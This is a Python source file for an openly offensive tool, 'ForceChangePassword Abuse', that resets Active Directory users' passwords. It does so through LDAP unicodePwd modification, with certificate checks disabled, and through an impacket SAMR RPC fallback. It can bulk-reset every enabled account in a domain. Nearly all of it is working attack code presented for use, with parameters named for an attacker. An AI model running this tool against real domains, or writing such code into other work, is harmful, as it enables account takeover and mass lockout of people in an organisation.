#!/usr/bin/env python3
import sys
import re
import ssl
import signal
import logging

from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, SUBTREE, Tls
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init

init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║      ForceChangePassword Abuse            ║
    ║  Change password of AD users via RPC/SAMR ║
    ╚═══════════════════════════════════════════╝
    """ + Style.RESET_ALL)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_password(password):
    return len(password) >= 7


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])


def check_ip_reachable(ip):
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 636))
        sock.close()
        if result == 0:
            return True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 389))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = get_base_dn(domain)
        tls     = Tls(validate=ssl.CERT_NONE)
        server  = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        conn.search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope=SUBTREE,
            attributes=['dc']
        )
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        try:
            base_dn = get_base_dn(domain)
            server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
            conn    = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=NTLM,
                auto_bind=True
            )
            conn.search(
                search_base=base_dn,
                search_filter='(objectClass=domain)',
                search_scope=SUBTREE,
                attributes=['dc']
            )
            result = len(conn.entries) > 0
            conn.unbind()
            return result
        except LDAPBindError:
            return "invalid_credentials"
        except Exception:
            return False


def ldap_connect(dc_ip, domain, username, password):
    try:
        tls    = Tls(validate=ssl.CERT_NONE)
        server = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
        conn   = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        print(Fore.GREEN + "[+] Connected via LDAPS (port 636)" + Style.RESET_ALL)
        return conn
    except Exception:
        pass

    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        print(Fore.YELLOW + "[!] Connected via LDAP (port 389) - password change may require LDAPS" + Style.RESET_ALL)
        return conn
    except LDAPBindError:
        print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
        return None


def get_all_users(conn, base_dn):
    try:
        conn.search(
            search_base=base_dn,
            search_filter='(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'distinguishedName']
        )
        return conn.entries
    except Exception as e:
        print(Fore.RED + f"[-] Failed to get users: {e}" + Style.RESET_ALL)
        return []


def force_change_password(conn, target_dn, new_password):
    try:
        encoded_password = ('"%s"' % new_password).encode('utf-16-le')

        conn.modify(
            target_dn,
            {'unicodePwd': [(MODIFY_REPLACE, [encoded_password])]}
        )

        if conn.result['result'] != 0:
            return conn.result['description']

        conn.modify(
            target_dn,
            {'pwdLastSet': [(MODIFY_REPLACE, [0])]}
        )

        conn.modify(
            target_dn,
            {'pwdLastSet': [(MODIFY_REPLACE, [-1])]}
        )

        if conn.result['result'] != 0:
            return conn.result['description']

        return True

    except Exception as e:
        return str(e)


def fix_pwd_last_set(conn, target_dn):
    try:
        conn.modify(target_dn, {'pwdLastSet': [(MODIFY_REPLACE, [0])]})
        conn.modify(target_dn, {'pwdLastSet': [(MODIFY_REPLACE, [-1])]})
        return conn.result['result'] == 0
    except Exception:
        return False


def force_change_password_rpc(dc_ip, domain, attacker_user, attacker_pass, target_user, new_password):
    try:
        from impacket.dcerpc.v5 import transport, samr
        from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
        try:
            from Crypto.Cipher import ARC4
        except ImportError:
            from Cryptodome.Cipher import ARC4
        from hashlib import md5
        import struct, os

        string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
        tr  = transport.DCERPCTransportFactory(string_binding)
        tr.set_credentials(attacker_user, attacker_pass, domain, '', '')
        dce = tr.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        resp       = samr.hSamrConnect(dce)
        server_hd  = resp['ServerHandle']

        resp       = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
        domain_sid = resp['DomainId']

        resp       = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
        domain_hd  = resp['DomainHandle']

        resp       = samr.hSamrLookupNamesInDomain(dce, domain_hd, [target_user])
        user_rid   = resp['RelativeIds']['Element'][0]['Data']

        resp       = samr.hSamrOpenUser(dce, domain_hd, MAXIMUM_ALLOWED, user_rid)
        user_hd    = resp['UserHandle']

        session_key = dce.get_rpc_transport().get_smb_connection().getSessionKey()

        pwd_encoded = new_password.encode('utf-16-le')
        pwd_buf     = pwd_encoded.rjust(512, b'\x00') + struct.pack('<I', len(pwd_encoded))

        salt        = os.urandom(16)
        keymd       = md5()
        keymd.update(salt)
        keymd.update(session_key)
        key         = keymd.digest()
        cipher      = ARC4.new(key)
        encrypted   = cipher.encrypt(pwd_buf) + salt

        request                                                              = samr.SamrSetInformationUser2()
        request['UserHandle']                                                = user_hd
        request['UserInformationClass']                                      = samr.USER_INFORMATION_CLASS.UserInternal4InformationNew
        request['Buffer']['tag']                                             = samr.USER_INFORMATION_CLASS.UserInternal4InformationNew
        request['Buffer']['Internal4New']['I1']['WhichFields']               = 0x01000000 | 0x08000000
        request['Buffer']['Internal4New']['I1']['UserName']                  = samr.NULL
        request['Buffer']['Internal4New']['I1']['FullName']                  = samr.NULL
        request['Buffer']['Internal4New']['I1']['HomeDirectory']             = samr.NULL
        request['Buffer']['Internal4New']['I1']['HomeDirectoryDrive']        = samr.NULL
        request['Buffer']['Internal4New']['I1']['ScriptPath']                = samr.NULL
        request['Buffer']['Internal4New']['I1']['ProfilePath']               = samr.NULL
        request['Buffer']['Internal4New']['I1']['AdminComment']              = samr.NULL
        request['Buffer']['Internal4New']['I1']['WorkStations']              = samr.NULL
        request['Buffer']['Internal4New']['I1']['UserComment']               = samr.NULL
        request['Buffer']['Internal4New']['I1']['Parameters']                = samr.NULL
        request['Buffer']['Internal4New']['I1']['LmOwfPassword']['Buffer']   = samr.NULL
        request['Buffer']['Internal4New']['I1']['NtOwfPassword']['Buffer']   = samr.NULL
        request['Buffer']['Internal4New']['I1']['PrivateData']               = samr.NULL
        request['Buffer']['Internal4New']['I1']['SecurityDescriptor']['SecurityDescriptor'] = samr.NULL
        request['Buffer']['Internal4New']['I1']['LogonHours']['LogonHours']  = samr.NULL
        request['Buffer']['Internal4New']['I1']['PasswordExpired']           = 0
        request['Buffer']['Internal4New']['UserPassword']['Buffer']          = encrypted

        dce.request(request)

        samr.hSamrCloseHandle(dce, user_hd)
        samr.hSamrCloseHandle(dce, domain_hd)
        samr.hSamrCloseHandle(dce, server_hd)
        dce.disconnect()
        return True

    except Exception as e:
        return str(e)


def do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass):
    print(Fore.YELLOW + "\n[*] Trying LDAP method..." + Style.RESET_ALL)
    result = force_change_password(conn, target_dn, new_pass)

    if result is True:
        print(Fore.GREEN + f"[+] Password changed via LDAP!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] {target} : {new_pass}" + Style.RESET_ALL)
        return True

    print(Fore.YELLOW + f"[!] LDAP failed: {result}" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Trying RPC method..." + Style.RESET_ALL)

    result2 = force_change_password_rpc(dc_ip, domain, username, password, target, new_pass)

    if result2 is True:
        print(Fore.YELLOW + "[*] Fixing pwdLastSet via LDAP..." + Style.RESET_ALL)
        fix_pwd_last_set(conn, target_dn)
        print(Fore.GREEN + f"[+] Password changed via RPC!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] {target} : {new_pass}" + Style.RESET_ALL)
        return True

    print(Fore.RED + f"[-] RPC failed: {result2}" + Style.RESET_ALL)
    print(Fore.RED + f"[-] No ForceChangePassword rights on '{target}'" + Style.RESET_ALL)
    return False


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )
    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: cs.org")
    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Connecting to LDAP..." + Style.RESET_ALL)
    conn = ldap_connect(dc_ip, domain, username, password)
    if not conn:
        sys.exit(1)

    base_dn = get_base_dn(domain)

    while True:
        print(Fore.CYAN + "\n[?] Choose action:" + Style.RESET_ALL)
        print(Fore.WHITE + "    1. Change password of specific user")
        print(Fore.WHITE + "    2. Change password of multiple users")
        print(Fore.WHITE + "    3. Exit")

        choice = get_input(
            Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
            lambda x: x in ['1', '2', '3'],
            "Invalid choice! Enter 1, 2 or 3"
        )

        if choice == '1':
            target = get_input(Fore.CYAN + "[?] Target Username      : " + Style.RESET_ALL)

            conn.search(
                search_base=base_dn,
                search_filter=f'(sAMAccountName={target})',
                search_scope=SUBTREE,
                attributes=['distinguishedName', 'sAMAccountName']
            )

            if not conn.entries:
                print(Fore.RED + f"[-] User '{target}' not found!" + Style.RESET_ALL)
                continue

            target_dn = str(conn.entries[0].distinguishedName)
            print(Fore.GREEN + f"[+] Found: {target_dn}" + Style.RESET_ALL)

            new_pass = get_input(
                Fore.CYAN + "[?] New Password         : " + Style.RESET_ALL,
                validate_password, "Password too short! (min 7 chars)"
            )

            do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass)

        elif choice == '2':
            print(Fore.YELLOW + "\n[*] Getting users..." + Style.RESET_ALL)
            users = get_all_users(conn, base_dn)
            if not users:
                print(Fore.RED + "[-] No users found!" + Style.RESET_ALL)
                continue

            print(Fore.GREEN + f"[+] Found {len(users)} users:" + Style.RESET_ALL)
            for i, user in enumerate(users, 1):
                print(Fore.WHITE + f"    {i:3}. {user.sAMAccountName}")

            targets_input = get_input(
                Fore.CYAN + "\n[?] User numbers (e.g. 1,2,3) or 'all': " + Style.RESET_ALL
            )

            if targets_input.lower() == 'all':
                selected = list(users)
            else:
                try:
                    indices  = [int(x.strip()) - 1 for x in targets_input.split(',')]
                    selected = [users[i] for i in indices if 0 <= i < len(users)]
                except Exception:
                    print(Fore.RED + "[-] Invalid selection!" + Style.RESET_ALL)
                    continue

            if not selected:
                print(Fore.RED + "[-] No users selected!" + Style.RESET_ALL)
                continue

            new_pass = get_input(
                Fore.CYAN + "[?] New Password         : " + Style.RESET_ALL,
                validate_password, "Password too short! (min 7 chars)"
            )

            success = 0
            failed  = 0

            for user in selected:
                target    = str(user.sAMAccountName)
                target_dn = str(user.distinguishedName)
                print(Fore.YELLOW + f"\n[*] Changing password for: {target}" + Style.RESET_ALL)
                if do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass):
                    success += 1
                else:
                    failed += 1

            print(Fore.CYAN  + f"\n[*] Done!" + Style.RESET_ALL)
            print(Fore.GREEN + f"[+] Success : {success}" + Style.RESET_ALL)
            print(Fore.RED   + f"[-] Failed  : {failed}" + Style.RESET_ALL)

        elif choice == '3':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            break
